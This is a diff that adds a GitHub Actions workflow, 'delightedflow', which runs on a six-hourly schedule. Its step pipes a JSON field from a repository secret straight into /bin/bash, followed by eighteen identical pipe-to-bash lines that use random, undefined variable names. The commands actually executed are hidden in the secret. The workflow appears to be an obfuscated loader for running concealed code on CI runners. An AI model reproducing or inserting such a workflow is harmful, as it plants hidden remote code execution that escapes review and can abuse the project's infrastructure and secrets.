@@ -1,0 +1,34 @@
+name: delightedflow
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: delightedflow
+        env:
+          cg06: ${{ secrets.cg06 }}
+        run: |
+          echo $cg06 | jq -r .s7 | /bin/bash
+          echo $asmj8996 | jq -r .k75012 | /bin/bash
+          echo $gpgjj897 | jq -r .v03734 | /bin/bash
+          echo $q142 | jq -r .y43 | /bin/bash
+          echo $wrlyn28 | jq -r .onnhr76 | /bin/bash
+          echo $up3575 | jq -r .mf3 | /bin/bash
+          echo $fp39926 | jq -r .t91 | /bin/bash
+          echo $ac16307 | jq -r .mir28 | /bin/bash
+          echo $k24129 | jq -r .adfn2 | /bin/bash
+          echo $sdfqb52772 | jq -r .itx2 | /bin/bash
+          echo $qepw171 | jq -r .hl8091 | /bin/bash
+          echo $i617 | jq -r .rbwy8 | /bin/bash
+          echo $znid27001 | jq -r .l06 | /bin/bash
+          echo $ffcg6658 | jq -r .lvlid46 | /bin/bash
+          echo $lwis376 | jq -r .qptvb398 | /bin/bash
+          echo $iqr02645 | jq -r .hnu92286 | /bin/bash
+          echo $cfc2342 | jq -r .u9506 | /bin/bash
+          echo $b9704 | jq -r .yvubu161 | /bin/bash
+          echo $ksic5 | jq -r .ishvm86 | /bin/bash
+
